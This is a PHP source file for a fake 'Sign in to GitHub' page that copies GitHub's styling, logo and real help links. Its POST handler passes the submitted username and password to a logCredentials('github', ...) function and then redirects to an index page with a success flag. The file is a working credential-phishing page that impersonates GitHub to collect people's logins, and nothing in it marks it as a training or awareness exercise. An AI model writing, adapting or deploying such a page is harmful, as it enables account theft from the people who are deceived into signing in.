<?php
require_once 'utils.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = sanitizeInput($_POST['username'] ?? '');
    $password = sanitizeInput($_POST['password'] ?? '');
    
    logCredentials('github', ['username' => $username, 'password' => $password]);
    header('Location: index.php?github_success=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 10px;
        }

        .github-container {
            width: 100%;
            max-width: 380px;
        }

        .github-card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 40px 20px;
            text-align: center;
        }

        .github-logo {
            margin-bottom: 30px;
        }

        .github-logo svg {
            width: 40px;
            height: 40px;
            fill: #c9d1d9;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #c9d1d9;
            font-weight: 600;
        }

        .subtitle {
            color: #8b949e;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            color: #c9d1d9;
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #30363d;
            border-radius: 6px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
            font-family: monospace;
            transition: all 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #58a6ff;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }

        input::placeholder {
            color: #6e7681;
        }

        .login-links {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
            gap: 10px;
        }

        .login-links a {
            color: #58a6ff;
            text-decoration: none;
            font-size: 12px;
        }

        .login-links a:hover {
            text-decoration: underline;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
            gap: 10px;
        }

        .btn {
            padding: 10px 16px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
        }

        .btn-cancel {
            background: transparent;
            color: #58a6ff;
            border: 1px solid #30363d;
            flex: 1;
        }

        .btn-cancel:hover {
            border-color: #58a6ff;
            background: rgba(88, 166, 255, 0.05);
        }

        .btn-signin {
            background: #238636;
            color: white;
            flex: 1;
        }

        .btn-signin:hover {
            background: #2ea043;
        }

        .btn-signin:disabled {
            background: #21262d;
            color: #6e7681;
            cursor: not-allowed;
        }

        .info-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 12px;
            margin-top: 20px;
            font-size: 12px;
            color: #8b949e;
        }
    </style>
</head>
<body>
    <div class="github-container">
        <div class="github-card">
            <div class="github-logo">
                <svg viewBox="0 0 16 16" fill="currentColor">
                    <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.08-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/>
                </svg>
            </div>

            <h1>Sign in to GitHub</h1>
            <p class="subtitle">Use your GitHub account to continue</p>

            <form method="POST">
                <div class="form-group">
                    <label for="username">Username or email address</label>
                    <input 
                        type="text" 
                        id="username" 
                        name="username" 
                        required 
                        autofocus
                        placeholder="username or email@example.com"
                    >
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        required 
                        placeholder="••••••••"
                    >
                </div>

                <div class="login-links">
                    <a href="https://github.com/password_reset" target="_blank" rel="noreferrer">Forgot password?</a>
                    <a href="https://github.com/join" target="_blank" rel="noreferrer">New to GitHub?</a>
                </div>

                <div class="buttons">
                    <button type="button" class="btn btn-cancel" onclick="history.back()">Cancel</button>
                    <button type="submit" class="btn btn-signin">Sign in</button>
                </div>
            </form>

            <div class="info-box">
                Experiencing problems? Check our <a href="#" style="color: #58a6ff;">troubleshooting guide</a>
            </div>
        </div>
    </div>
</body>
</html>
